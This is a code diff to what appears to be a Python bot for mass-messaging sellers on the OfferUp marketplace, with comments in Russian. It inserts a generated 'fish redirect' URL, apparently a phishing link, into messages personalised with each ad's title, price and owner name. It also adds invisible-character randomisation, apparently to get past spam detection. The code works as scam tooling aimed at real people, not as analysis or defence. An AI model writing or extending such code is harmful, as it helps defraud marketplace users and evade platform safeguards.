@@ -201,15 +201,21 @@ class OfferUpAccount:
                 if "{fish}" in msg_text:
                     fish_redirect = generate_fish_redirect_url()
                     msg_text = msg_text.replace("{fish}", fish_redirect)
-
-                msg_text = msg_text.format(
-                    title = ad["title"],
-                    price = ad["price"],
-                    owner_name = ad["owner"]["profile"]["name"],
-                    random = generate_random_string(length=5)
-                )
-                # Рандомизируем невидимым символом
-                # msg_text = format_text_words(msg_text)
+                    msg_text = msg_text.format(
+                        title=ad["title"],
+                        price=ad["price"],
+                        owner_name=ad["owner"]["profile"]["name"],
+                        random=generate_random_string(length=5)
+                    )
+                else:
+                    # Рандомизируем невидимым символом
+                    msg_text = msg_text.format(
+                        title=ad["title"],
+                        price=ad["price"],
+                        owner_name=ad["owner"]["profile"]["name"],
+                        random=generate_random_string(length=5)
+                    )
+                    msg_text = format_text_words(msg_text)
 
                 logger.debug(f"Отправляем {msg_num} сообщение '{msg_text}' по объявлению {ad_id}...")
                 if msg_num == 1:
